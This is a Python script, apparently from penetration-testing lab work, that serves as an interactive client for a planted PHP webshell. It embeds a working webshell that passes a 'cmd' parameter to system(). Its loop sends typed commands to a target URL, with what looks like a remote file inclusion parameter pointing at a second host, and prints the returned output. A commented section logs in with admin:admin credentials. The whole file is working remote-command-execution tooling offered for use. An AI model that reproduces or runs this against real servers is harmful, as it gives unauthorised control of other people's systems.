#!/usr/bin/python3
"""
Webshell-client
By peetKh OS-65554

A very simple webshell client to make use of webshell more confortable.
It's more like a template than a real finished tool.


Provides a convenient prompt with history and completion from history.


This script extracts the content between two markers (startSeq and endSeq) from
the HTTP response. This makes it more comfortable when the system call output
is surrounded by unrelevant text, like sometimes when exploiting a command
injection, or if your webshell has a form to enter commands (as the one below)

If there is no surrounding text or if you want the raw content, just set
startSeq to None



If you're using Kali you might have to install/update some python packages


"""

import requests
from prompt_toolkit import PromptSession
from prompt_toolkit.history import InMemoryHistory
from prompt_toolkit.history import FileHistory
from prompt_toolkit.auto_suggest import AutoSuggestFromHistory
from prompt_toolkit.styles import Style

# Just an example of webshell to be used with
# The webshell variable is actually never used in this script
webshell = """
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<!-- asdo5426 --><pre><?php if(isset($_GET['cmd'])){system($_GET['cmd'].' 2>&1');}?></pre><!-- awed0903 -->
</body>
<script>document.getElementById("cmd").focus();</script>
</html>
"""

# Parameters ===================================================================
# Update these to fit your needs

# URL of the webshell and GET params (for all cmd executions)
url = 'http://10.1.2.3/action=/inc/config.php'
params = {'basePath' : 'http://192.168.1.2/'} # GET params
data = {'foo' : 'bar'} # POST data

# Delimiters for the system() call output or None for raw output
startSeq = '<!-- asdo5426 --><pre>'
endSeq = '</pre><!-- awed0903 -->'
#startSeq = None
#endSeq = None

historyFile = './webshell_history'

# Main program =================================================================

promptSession = PromptSession(
    history=FileHistory( historyFile))

style = Style.from_dict({
    # User input (default text).
    '': '#ff0066',
    # Prompt.
    'prompt': '#aa22ff',
})

promptMessage = [
    ('class:prompt', 'webshell> '),
]

s = requests.Session()

# # Authentication ===============================================================
# # If auth or other pre operations are needed
#
# print("[*] Retrieve login page")
# s.get('http://10.1.2.3/login.php')
#
# print("[*] Sending credentials")
# s.post('http://10.1.2.3/login.php', data =
#     {'Username':'admin', 'Password':'admin', 'Submit':'Login'})
#
# # Or set cookies (NOT TESTED)
# s.cookies.set("COOKIE_NAME", "value", domain="example.com")

# Webshell loop ================================================================


while True:
    cmd = promptSession.prompt(promptMessage,
        auto_suggest=AutoSuggestFromHistory(),
        style = style )
    if cmd == 'exit':
        break


    # To get the formatted URL before sending the request
    # (good for debugging and reporting)
    # GET request
    params['cmd'] = cmd
    req = requests.Request('GET',  url, params=params)
    prepReq = s.prepare_request(req)
    print("     get> %s\n" % prepReq.url)

    # # POST request
    # data['cmd'] = cmd
    # req = requests.Request('POST',  url, params=params, data=data)
    # prepReq = s.prepare_request(req)
    # print("     post> %s\n     data: %s\n" % (prepReq.url, repr(data))

    r  = s.send(prepReq)
    if startSeq is None:
        posStart = 0
    else:
        posStart = r.text.find(startSeq)
        if posStart == -1:
            posStart = 0
        else:
            posStart += len(startSeq)
    if endSeq is None:
        posEnd = len(r.text)
    else:
        posEnd = r.text.find(endSeq)
        if posEnd == -1:
            posEnd = len(r.text)

    print(r.text[posStart:posEnd])
